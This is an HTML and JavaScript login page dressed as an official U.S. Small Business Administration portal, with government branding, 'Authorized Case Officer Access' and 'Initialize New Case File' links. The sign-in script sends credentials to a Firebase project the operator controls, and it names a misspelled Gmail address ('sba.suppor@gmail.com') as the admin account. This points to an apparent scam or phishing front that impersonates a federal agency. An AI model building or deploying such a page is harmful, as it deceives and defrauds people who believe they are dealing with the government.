<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SBA Portal | Secure Authentication</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        /* OFFICIAL GOVERNMENT COLORS */
        :root {
            --sba-navy: #002e6d;   /* Official SBA Navy */
            --sba-accent: #cc0000;  /* Official SBA Red */
            --sba-bg: #f4f7f9;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background-color: var(--sba-bg);
            margin: 0;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        /* HARD, PROFESSIONAL DESIGN */
        .auth-card {
            background-color: #ffffff;
            border-top: 5px solid var(--sba-navy);
            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
            border-radius: 2px; /* Sharp edges for that professional feel */
            width: 100%;
            max-width: 400px;
            margin: auto;
            padding: 30px;
        }

        /* Logo box styling matching the SBA official look */
        .sba-logo-box {
            display: inline-flex;
            flex-direction: column;
            border: 2px solid var(--sba-navy);
            padding: 3px 5px;
            line-height: 1;
            margin-right: 10px;
        }

        /* COMPACT, PRECISE INPUTS */
        .input-group input {
            height: 48px;
            border: 1px solid #cbd5e1;
            border-radius: 2px;
            font-weight: 500;
            transition: 0.2s;
            width: 100%;
            padding: 0 15px;
        }

        .input-group input:focus {
            border-color: var(--sba-navy);
            box-shadow: 0 0 0 3px rgba(0, 46, 109, 0.1);
            outline: none;
        }

        /* HIGH-AUTHORITY BUTTON */
        .btn-gov {
            background-color: var(--sba-navy);
            color: #ffffff;
            height: 50px;
            font-weight: 900;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            border-radius: 2px;
            transition: 0.2s;
            border: none;
            width: 100%;
            cursor: pointer;
            margin-top: 20px;
        }

        .btn-gov:hover {
            background-color: #001a3d;
            transform: translateY(-1px);
        }

        /* Mobile Optimization */
        @media (max-width: 450px) {
            .auth-card {
                padding: 20px;
                max-width: 90%;
            }
        }
    </style>
</head>
<body class="min-h-screen flex flex-col">

    <header class="bg-[#efefef] border-b border-gray-300 py-1.5 px-4 flex items-center justify-between">
        <div class="flex items-center gap-2">
            <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" class="w-4 shadow-sm" alt="USA">
            <p class="text-[9px] font-black text-gray-600 uppercase tracking-widest">Official SBA Government Terminal v2.6</p>
        </div>
    </header>

    <main class="flex-grow flex items-center justify-center p-4">
        <div class="auth-card">
            
            <div class="mb-10 text-center">
                <div class="flex items-center justify-center mb-6">
                    <div class="sba-logo-box">
                        <span class="text-xl font-black text-[#002e6d] tracking-tighter uppercase">SBA</span>
                    </div>
                    <div class="h-10 w-[1.5px] bg-gray-200"></div>
                    <div class="ml-3 text-left leading-tight">
                        <p class="text-[10px] font-black text-slate-500 uppercase tracking-wider">U.S. Small Business</p>
                        <p class="text-[10px] font-black text-slate-500 uppercase tracking-wider">Administration</p>
                    </div>
                </div>
                <h1 class="text-2xl font-black text-slate-800 uppercase tracking-tighter">Sign In</h1>
                <p class="text-slate-400 text-[10px] font-bold uppercase tracking-[0.2em] mt-2">Authorized Case Officer Access</p>
            </div>

            <button type="button" id="googleBtn" class="w-full flex items-center justify-center gap-3 bg-white border border-gray-300 h-12 text-[11px] font-bold uppercase tracking-wider text-gray-700 hover:bg-gray-50 transition-all rounded shadow-sm">
                <img src="https://www.gstatic.com/lamda/images/google_logo_color_24dp.png" class="w-5" alt="G">
                Continue with Google
            </button>

            <div class="relative flex py-3 items-center">
                <div class="flex-grow border-t border-gray-200"></div>
                <span class="flex-shrink mx-3 text-[9px] font-black text-gray-400 uppercase tracking-widest">OR DIRECT ENTRY</span>
                <div class="flex-grow border-t border-gray-200"></div>
            </div>

            <form id="loginForm" class="space-y-5">
                <div id="alertBox" class="hidden p-3 bg-red-50 border-l-4 border-red-600 text-red-700 text-[10px] font-black uppercase italic shadow-sm"></div>

                <div class="input-group">
                    <label class="block text-[10px] font-black text-slate-500 uppercase tracking-widest mb-2 ml-1">Government Email</label>
                    <input type="email" id="userEmail" required class="w-full bg-white border border-slate-200 outline-none transition-all text-sm" placeholder="user@sba.gov">
                </div>

                <div class="input-group">
                    <label class="block text-[10px] font-black text-slate-500 uppercase tracking-widest mb-2 ml-1">Secure Passkey</label>
                    <div class="relative flex items-center">
                        <input type="password" id="userPass" required class="w-full bg-white border border-slate-200 outline-none pr-12 transition-all text-sm" placeholder="••••••••">
                        <span class="absolute right-4 text-slate-400 cursor-pointer" onclick="togglePasswordVisibility()">
                            <i id="eyeIcon" class="fas fa-eye"></i>
                        </span>
                    </div>
                </div>

                <div class="flex items-center justify-between text-[10px] font-bold text-slate-500 uppercase tracking-wider">
                    <label class="flex items-center gap-2 cursor-pointer">
                        <input type="checkbox" class="accent-[#002e6d] w-3 h-3"> Remember Node
                    </label>
                    <a href="forget-password.html" class="text-blue-700 hover:underline">Forgot Access?</a>
                </div>

                <button type="submit" id="submitBtn" class="btn-gov w-full h-12 text-white uppercase shadow-lg mt-4">
                    Authorized Login
                </button>
            </form>

            <div class="mt-8 pt-6 border-t border-gray-100 text-center">
                <p class="text-[10px] text-gray-400 font-bold uppercase mb-2">Unauthorized access is monitored</p>
                <a href="register.html" class="text-[#002e6d] font-black text-[12px] uppercase tracking-[0.2em] hover:text-red-600 transition-all">Initialize New Case File</a>
            </div>
        </div>
    </main>

    <footer class="py-8 text-center text-[9px] text-gray-400 font-bold uppercase tracking-[0.4em]">
        <i class="fas fa-lock mr-2"></i> Encrypted Terminal | Case Node v15.1
    </footer>

    <script type="module">
        import { auth, ADMIN_EMAIL } from './firebase-config.js';
        import { signInWithEmailAndPassword, signInWithPopup, GoogleAuthProvider } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";

        const loginForm = document.getElementById('loginForm');
        const alertBox = document.getElementById('alertBox');
        const btn = document.getElementById('submitBtn');
        const googleBtn = document.getElementById('googleBtn');

        // UPDATED ADMIN EMAIL AS PER INSTRUCTION
        // const ADMIN_EMAIL = "sba.suppor@gmail.com"; // Set in your firebase-config.js

        window.togglePasswordVisibility = function() {
            const passInput = document.getElementById('userPass');
            const eyeIcon = document.getElementById('eyeIcon');
            if (passInput.type === "password") {
                passInput.type = "text";
                eyeIcon.className = "fas fa-eye-slash";
            } else {
                passInput.type = "password";
                eyeIcon.className = "fas fa-eye";
            }
        };

        const handleAuthSuccess = (email) => {
            if (email === ADMIN_EMAIL) {
                window.location.href = "admin-portal.html";
            } else {
                window.location.href = "dashboard.html"; // Changed to dashboard.html, you can change to welcome.html if preferred.
            }
        };

        loginForm.onsubmit = async (e) => {
            e.preventDefault();
            alertBox.classList.add('hidden');
            const email = document.getElementById('userEmail').value.toLowerCase().trim();
            const pass = document.getElementById('userPass').value;

            btn.disabled = true;
            btn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> AUTHORIZING...';

            try {
                const userCredential = await signInWithEmailAndPassword(auth, email, pass);
                handleAuthSuccess(userCredential.user.email);
            } catch (error) {
                btn.disabled = false;
                btn.innerText = "Authorized Login";
                alertBox.innerText = "AUTH ERROR: " + error.message;
                alertBox.classList.remove('hidden');
            }
        };

        googleBtn.onclick = async () => {
            alertBox.classList.add('hidden');
            try {
                const provider = new GoogleAuthProvider();
                const result = await signInWithPopup(auth, provider);
                handleAuthSuccess(result.user.email);
            } catch (error) {
                alertBox.innerText = "GOOGLE AUTH ERROR: " + error.message;
                alertBox.classList.remove('hidden');
            }
        };
    </script>
</body>
</html>
